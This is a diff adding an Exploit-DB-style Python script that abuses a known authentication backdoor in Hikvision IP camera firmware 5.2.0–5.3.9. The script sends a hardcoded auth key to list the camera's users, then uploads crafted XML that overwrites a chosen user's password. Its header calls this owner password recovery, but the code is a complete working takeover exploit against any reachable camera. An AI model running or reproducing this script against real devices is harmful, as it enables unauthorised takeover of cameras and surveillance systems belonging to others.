@@ -1,0 +1,98 @@
+# Exploit Title: Hikvision IP Camera versions 5.2.0 - 5.3.9 (Builds: 140721 - 170109) Backdoor
+# Date: 15-03-2018
+# Vendor Homepage: http://www.hikvision.com/en/
+# Exploit Author: Matamorphosis
+# Category: Web Apps
+# Description: Exploits a backdoor in Hikvision camera firmware versions 5.2.0 - 5.3.9 (Builds: 140721 - 170109), deployed between 2014 and 2016, to assist the owner recover their password.
+# Vulnerability Exploited: ICSA-17-124-01 - http://seclists.org/fulldisclosure/2017/Sep/23
+
+#!/usr/bin/env python
+# Usage: python exploit.py [IP Address] [Port] [SSL (Y/N)]
+
+import requests
+import re
+import sys
+
+# BASIC INFO
+
+newPass = "@Dm1N1$Tr80R" # EXAMPLE OF A PASSWORD COMPLIANT WITH LATER FIRMWARES REQUIRING AT LEAST 2 UPPERCASE, 2 lowercase, and 2 SPECIAL CHARACTERS.
+BackdoorAuthArg = "auth=YWRtaW46MTEK"; # AUTHENTICATION KEY.
+ip = ""
+port = 0
+SSL = ""
+userID = ""
+userName = ""
+
+def Usage():
+	print("[i] Usage: python exploit.py [IP Address] [Port] [SSL (Y/N)]")
+
+try:
+	ip = sys.argv[1]
+	SSL = sys.argv[3]
+
+except:
+	print("[-] One or more of the arguments is missing.")
+	Usage()
+	sys.exit()
+
+ipmatch = re.search(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", ip) 			# IP ADDRESS REGULAR EXPRESSION.
+
+if not ipmatch:
+	print("[-] The entered ip address " + ip + " is not in the correct format.")
+	Usage()
+	sys.exit()
+
+try:
+	port = int(sys.argv[2])
+
+except:
+	print("[-] The entered port " + sys.argv[2] + " is not a number.")
+	Usage()
+	sys.exit()
+
+if (port == 0) or (port > 65535):
+	print("[-] The entered port " + sys.argv[2] + " is not a valid port number.")
+	Usage()
+	sys.exit()
+
+if SSL == "Y":
+	protocol = "https"
+
+else:
+	protocol = "http"
+
+URLBase = protocol + "://" + ip + ":" + str(port) + "/" 					# URL BASE FOR FUTURE REQUESTS.
+URLDownload = URLBase + "Security/users?" + BackdoorAuthArg 				# DOWNLOAD REQUEST.
+
+print("[+] Getting User List.")
+
+DownloadResponse = requests.get(URLDownload).text
+
+for line in DownloadResponse: 												# RETRIEVING USER LIST
+	useridmatch = re.search(r"<id>(.*)<\/id>", line) 						# CHECK FOR USER ID.
+	usernamematch = re.search(r"<userName>(.*)<\/userName>", line) 			# CHECK FOR USER NAME.
+
+	if useridmatch:
+		userID = useridmatch.group(1)
+		print("[+] User ID: " + userID)
+
+	if usernamematch:
+		userName = usernamematch.group(1)
+		print("[+] Username: " + userName)
+
+userID = raw_input("[?] Which User ID would you like to use? ")
+userName = raw_input("[?] Which Username would you like to use? ")
+
+print("[+] Using the User " + userName + ".")
+
+userXML = ( '<User version=""1.0"" xmlns=""http://www.hikvision.com/ver10/XMLSchema"">\r\n<id>' + userID + '</id>\r\n<userName>' + userName + '</userName>\r\n<password>' + newPass + '</password>\r\n</User>' ) # OUR CRAFTED XML CONFIGURATION FILE
+
+#print(userXML)
+
+URLUpload = URLBase + "Security/users/" + userID + "?" + BackdoorAuthArg 	# UPLOAD REQUEST.
+
+print("[+] Changing Password now.")
+
+print requests.put(URLUpload, data=userXML).text 							# UPLOAD REQUEST, SENDING THE PAYLOAD.
+
+print("[+] Complete. Please try logging in with these credentials. Username: " + userName + "Password: " + newPass)
